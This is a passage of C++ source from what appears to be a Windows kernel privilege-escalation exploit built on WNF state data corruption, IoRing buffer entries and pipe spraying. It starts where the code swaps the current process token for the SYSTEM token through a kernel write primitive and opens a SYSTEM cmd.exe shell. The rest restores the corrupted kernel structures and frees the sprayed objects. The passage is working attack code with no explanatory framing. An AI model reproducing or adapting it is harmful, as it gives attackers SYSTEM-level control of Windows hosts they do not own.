    cur_token_ptr = cur_eproc + EPROCESS_TOKEN_OFFSET;

    KWrite((PVOID)cur_token_ptr, reinterpret_cast<PBYTE>(&system_token), sizeof(system_token));

    system("cmd.exe");

    ////getchar();

    //freeing everything

    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), backup_buffer, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on max_corrupted returned " << std::hex << result << std::endl;
    }

    //restoring original buffer entry
    regBuffersAddr[0] = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(original_regBufferEntry);

    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), buffer, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on tokenControllerWNF returned " << std::hex << result << std::endl;
    }

    std::cout << "calling NtUpdateWnfStateData returned successfully" << std::endl;

    //cleanup
    for (int i = 0; i < IORINGS_SIZE; i++) {
        result = CloseIoRing(reinterpret_cast<HIORING>(iorings[i]));
        if (!SUCCEEDED(result)) {
            printf("[-] Failed CloseIoRing: 0x%x\n", result);
            return FALSE;
        }
    }

    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
        if (!CloseHandle(spray_pipes[i].pipe_read)) {
            std::cout << "CloseHandle failed with error 0x" << std::hex << result << std::endl;
        }
        if (!CloseHandle(spray_pipes[i].pipe_write)) {
            std::cout << "CloseHandle failed with error 0x" << std::hex << result << std::endl;
        }
    }

    for (auto& state : statenames1) {
        result = fNtDeleteWnfStateName(&state);
        if (result != 0) {
            std::cout << "NtDeleteWnfStateName returned " << std::hex << result << std::endl;
        }
    }

    for (auto& state : statenames2) {
        result = fNtDeleteWnfStateName(&state);
        if (result != 0) {
            std::cout << "NtDeleteWnfStateName returned " << std::hex << result << std::endl;
        }
    }

    for (auto& state : statenames3) {
        result = fNtDeleteWnfStateName(&state);
        if (result != 0) {
            std::cout << "NtDeleteWnfStateName returned " << std::hex << result << std::endl;
        }
    }
    //std::cout << Hexdump(buffer, max_corrupted->get()->dataSize) << std::endl << std::endl;

    return 0;
}
